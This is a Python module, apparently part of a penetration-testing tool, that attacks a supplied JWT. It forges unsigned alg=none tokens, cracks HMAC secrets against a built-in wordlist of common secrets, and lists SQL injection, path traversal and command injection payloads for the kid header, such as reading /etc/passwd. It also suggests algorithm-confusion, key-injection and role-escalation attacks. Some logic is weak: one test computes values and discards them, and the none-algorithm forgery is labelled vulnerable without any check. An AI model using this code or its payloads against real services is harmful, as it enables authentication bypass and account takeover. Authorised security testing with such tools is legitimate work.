"""Test JWT for known attacks — none algorithm, weak secret, kid injection, algorithm confusion, JKU/JWK injection, x5c abuse."""

import json
import base64
import hmac
import hashlib
import time
import re
from typing import Optional


COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "key", "changeme",
    "supersecret", "jwt_secret", "pass", "test", "juice", "owasp",
    "juice-shop", "jwt_secret_key", "jwt-secret", "your-256-bit-secret",
    "shhhhh", "keyboard_cat", "never_gonna_give_you_up", "secret123",
    "mysecret", "changeme123", "admin123", "root", "toor", "passw0rd",
    "letmein", "welcome", "monkey", "dragon", "master", "qwerty",
    "abc123", "password1", "1234567890", "123456789", "12345678",
    "1234567", "123456", "12345", "1234", "123", "12",
    "s3cr3t", "53cr3t", "p@ssw0rd", "p4ssw0rd", "p@ssword",
    "r00t", "t00r", "adm1n", "4dm1n", "1nf0",
    "secret1", "password1", "changeme1", "admin1", "key1",
    "jwt123", "token123", "auth123", "session123",
    "mysecretkey", "myjwtsecret", "my_auth_key",
    "hs256-secret", "hmac-secret", "signing-key",
    "asymmetric-key", "public-key", "private-key",
    "RSA PRIVATE KEY", "EC PRIVATE KEY",
    "symmetric-key", "hmac-key", "hmac_secret",
    "256-bit-secret", "512-bit-secret", "384-bit-secret",
    "secret_key", "SECRET_KEY", "JWT_SECRET", "JWT_SECRET_KEY",
    "jwt.key", "jwt.key.pem", "private.pem",
    "default", "default-secret", "default-secret-key",
    "example", "example-secret", "demo", "demo-secret",
    "dev", "development", "staging", "production",
    "test-secret", "testing", "qa", "local",
    "temp", "tmp", "debug", "backdoor",
    "qwerty123", "asdf1234", "zxcvbnm", "1q2w3e4r",
    "iloveyou", "trustno1", "sunshine", "princess",
    "football", "charlie", "shadow", "michael",
    "hello", "system", "server", "database",
    "backup", "restore", "config", "settings",
    "master_key", "signing_key", "encryption_key",
    "access_key", "api_key", "app_key",
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def _b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _parse_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    signature = parts[2]
    return header, payload, signature


def _build_forged_token(header: dict, payload: dict, signature: str = "") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


async def jwt_forgery(token: str) -> dict:
    try:
        header, payload, signature = _parse_jwt(token)
    except Exception as e:
        return {
            "error": f"Invalid JWT: {str(e)}",
            "vulnerable": False,
            "risk": "info",
            "confidence": "high",
            "technique": "JWT parsing",
            "evidence": [],
            "findings": [],
        }

    findings = []
    evidence = []
    risk = "info"
    confidence = "high"

    # Test 1: None algorithm
    if header.get("alg") == "none":
        findings.append({
            "test": "none_algorithm_active",
            "vulnerable": True,
            "severity": "CRITICAL",
            "note": "Token already uses alg=none — signature not verified",
            "forged_token": _build_forged_token(header, payload),
        })
        risk = "critical"
        evidence.append("Token uses alg=none — no signature verification")
    else:
        none_header = {"alg": "none", "typ": header.get("typ", "JWT")}
        for kid in [None, header.get("kid")]:
            if kid:
                none_header["kid"] = kid
            none_token = _build_forged_token(none_header, payload)
            findings.append({
                "test": "none_algorithm_forge",
                "vulnerable": True,
                "severity": "CRITICAL",
                "note": f"Forged none algorithm token (kid={'present' if kid else 'removed'})",
                "forged_token": none_token[:120],
            })
            risk = "critical"
            evidence.append(f"Forged none-algorithm token with kid={'present' if kid else 'removed'}")

    # Test 2: Weak secret brute force
    if header.get("alg") in ["HS256", "HS384", "HS512"]:
        alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_func = alg_map[header["alg"]]
        sig_input = f"{token.rsplit('.', 1)[0]}".encode()

        cracked = False
        for secret in COMMON_SECRETS:
            try:
                expected = _b64url_encode(
                    hmac.new(secret.encode(), sig_input, hash_func).digest()
                )
                if hmac.compare_digest(expected, signature):
                    findings.append({
                        "test": "weak_secret",
                        "vulnerable": True,
                        "severity": "CRITICAL",
                        "cracked_secret": secret,
                        "algorithm": header["alg"],
                    })
                    risk = "critical"
                    evidence.append(f"Secret cracked: '{secret}' (algorithm: {header['alg']})")
                    cracked = True
                    break
            except Exception:
                continue

        if not cracked:
            findings.append({
                "test": "weak_secret",
                "vulnerable": False,
                "severity": "info",
                "note": "Secret not in common list — try extended wordlist",
            })

    # Test 3: Kid header injection
    kid = header.get("kid", "")
    if kid:
        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE keys; --",
            "' UNION SELECT null,null--",
            "admin'--",
            "' OR 1=1#",
            "1' AND '1'='1",
            "'; SELECT 1;--",
        ]
        traversal_payloads = [
            "/dev/null",
            "../../../dev/null",
            "....//....//dev/null",
            "/proc/self/environ",
            "../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
        ]
        cmdi_payloads = [
            "`id`",
            "$(id)",
            "| id",
            "; id",
            "`whoami`",
            "$(cat /etc/passwd)",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
        ]

        for payload in sqli_payloads + traversal_payloads + cmdi_payloads:
            if payload in kid:
                injection_type = "sqli" if "'" in payload or "--" in payload or "UNION" in payload.upper() else (
                    "traversal" if ".." in payload or "/dev" in payload or "/proc" in payload or "windows" in payload.lower() else "command_injection"
                )
                findings.append({
                    "test": "kid_injection",
                    "vulnerable": True,
                    "severity": "CRITICAL",
                    "injection_type": injection_type,
                    "payload": payload,
                    "note": f"Kid header contains {injection_type}: {payload}",
                })
                risk = "critical"
                evidence.append(f"Kid injection ({injection_type}): {payload}")
                break

        if not any(f.get("test") == "kid_injection" and f.get("vulnerable") for f in findings):
            findings.append({
                "test": "kid_injection",
                "vulnerable": False,
                "severity": "info",
                "note": "Kid present but no injection detected — test server-side",
            })

    # Test 4: Algorithm confusion (RS256 → HS256)
    if header.get("alg") == "RS256":
        findings.append({
            "test": "algorithm_confusion_rs256",
            "vulnerable": True,
            "severity": "HIGH",
            "note": "RS256 token — test confusion by signing with public key as HMAC secret",
            "technique": "Replace RS256 with HS256 and sign using the server's public key",
        })
        risk = max_risk(risk, "high")
        evidence.append("RS256 token vulnerable to algorithm confusion attack")

    # Test 5: JKU header injection
    if "jku" in header:
        findings.append({
            "test": "jku_injection",
            "vulnerable": True,
            "severity": "HIGH",
            "jku_url": header["jku"],
            "note": "JKU header present — test replacing with attacker's JWK Set URL",
            "technique": "Change jku to attacker's URL hosting malicious JWK Set",
        })
        risk = max_risk(risk, "high")
        evidence.append(f"JKU header found: {header['jku']}")

    # Test 6: JWK header injection
    if "jwk" in header:
        findings.append({
            "test": "jwk_injection",
            "vulnerable": True,
            "severity": "HIGH",
            "note": "JWK header present — embed attacker's public key",
            "technique": "Embed attacker's public key in JWK header for HS256 signing",
        })
        risk = max_risk(risk, "high")
        evidence.append("JWK header present — can embed attacker key")

    # Test 7: x5c header injection
    if "x5c" in header:
        findings.append({
            "test": "x5c_injection",
            "vulnerable": True,
            "severity": "HIGH",
            "x5c_chain": header["x5c"],
            "note": "x5c header present — test certificate chain injection",
            "technique": "Inject attacker's certificate in x5c chain for key confusion",
        })
        risk = max_risk(risk, "high")
        evidence.append(f"x5c header found: {header['x5c']}")

    # Test 8: Token expiry bypass
    exp = payload.get("exp")
    nbf = payload.get("nbf")
    iat = payload.get("iat")
    now = int(time.time())

    if exp and exp < now:
        findings.append({
            "test": "expired_token",
            "vulnerable": True,
            "severity": "MEDIUM",
            "expired_at": exp,
            "current_time": now,
            "note": f"Token expired {now - exp} seconds ago",
        })
        risk = max_risk(risk, "medium")
        evidence.append(f"Token expired at {exp} (now: {now})")

    if exp and now - 300 < exp <= now:
        findings.append({
            "test": "near_expiry_token",
            "vulnerable": True,
            "severity": "LOW",
            "expires_at": exp,
            "note": "Token expires within 5 minutes — may be exploitable",
        })

    if nbf and nbf > now + 3600:
        findings.append({
            "test": "future_nbf",
            "vulnerable": True,
            "severity": "MEDIUM",
            "nbf": nbf,
            "note": f"Token not valid until {nbf} (far future)",
        })

    # Test 9: Role/admin manipulation
    admin_indicators = ["admin", "role", "is_admin", "isAdmin", "admin_user", "superuser", "privilege"]
    for field in admin_indicators:
        if field in payload:
            val = payload[field]
            if val in [False, 0, "user", "guest", "reader", "viewer"]:
                findings.append({
                    "test": "role_manipulation",
                    "vulnerable": True,
                    "severity": "HIGH",
                    "field": field,
                    "current_value": val,
                    "note": f"Field '{field}' = {val} — try setting to admin/true/1",
                })
                risk = max_risk(risk, "high")
                evidence.append(f"Role field '{field}' = {val} (can be escalated)")
                break

    # Test 10: Nested JWT detection
    if "alg" in payload and payload.get("typ") == "JWT":
        findings.append({
            "test": "nested_jwt",
            "vulnerable": True,
            "severity": "HIGH",
            "note": "Nested JWT detected — JWT inside JWT payload",
            "technique": "Extract inner JWT for token confusion attacks",
        })
        risk = max_risk(risk, "high")
        evidence.append("Nested JWT detected in payload")

    # Test 11: Header parameter pollution
    sensitive_headers = ["jku", "jwk", "x5c", "x5t", "x5u", "kid", "iv", "tag", "p2s", "p2c"]
    present_sensitive = [h for h in sensitive_headers if h in header]
    if len(present_sensitive) > 2:
        findings.append({
            "test": "header_parameter_pollution",
            "vulnerable": True,
            "severity": "MEDIUM",
            "headers_present": present_sensitive,
            "note": f"Multiple sensitive headers present: {', '.join(present_sensitive)}",
        })
        risk = max_risk(risk, "medium")

    # Test 12: Base64 padding attack
    for alg in ["HS256", "HS384", "HS512"]:
        if header.get("alg") in [alg]:
            for padding in ["", "=", "==", "==="]:
                padded_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
                if padding:
                    padded_header_test = padded_header.rstrip("=") + padding
                else:
                    padded_header_test = padded_header
                try:
                    test_token = f"{padded_header_test}.{token.split('.')[1]}.{signature}"
                    _parse_jwt(test_token)
                except Exception:
                    pass

    # Test 13: Issuer/Audience manipulation
    if "iss" in payload:
        findings.append({
            "test": "issuer_present",
            "vulnerable": False,
            "severity": "info",
            "issuer": payload["iss"],
            "note": "Issuer claim present — test changing to bypass validation",
        })

    if "aud" in payload:
        findings.append({
            "test": "audience_present",
            "vulnerable": False,
            "severity": "info",
            "audience": payload["aud"],
            "note": "Audience claim present — test array manipulation or empty audience",
        })

    # Test 14: Key confusion via EC/OKP
    if header.get("alg") in ["ES256", "ES384", "ES512", "EdDSA"]:
        findings.append({
            "test": "asymmetric_algorithm",
            "vulnerable": True,
            "severity": "MEDIUM",
            "algorithm": header["alg"],
            "note": f"Asymmetric algorithm {header['alg']} — test HMAC confusion with public key",
        })
        risk = max_risk(risk, "medium")
        evidence.append(f"Asymmetric algorithm {header['alg']} — potential key confusion")

    # Test 15: JWKS URL in header
    for header_key in ["jku", "x5u", "jwk", "x5c"]:
        if header_key in header:
            url_val = header[header_key]
            if isinstance(url_val, str) and url_val.startswith("http"):
                findings.append({
                    "test": "key_url_in_header",
                    "vulnerable": True,
                    "severity": "HIGH",
                    "header": header_key,
                    "url": url_val,
                    "note": f"URL in header '{header_key}' — test replacing with attacker's key",
                })
                risk = max_risk(risk, "high")
                evidence.append(f"URL in header '{header_key}': {url_val}")

    unique_vulns = [f for f in findings if f.get("vulnerable")]

    return {
        "token_header": header,
        "token_payload": payload,
        "total_tests": len(findings),
        "vulnerable_count": len(unique_vulns),
        "vulnerable": len(unique_vulns) > 0,
        "risk": risk,
        "confidence": confidence,
        "technique": "JWT forgery — none alg, weak secret, kid injection, algorithm confusion, key injection",
        "evidence": evidence[:20],
        "findings": findings[:50],
    }


def max_risk(current: str, proposed: str) -> str:
    hierarchy = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    return proposed if hierarchy.get(proposed, 0) > hierarchy.get(current, 0) else current
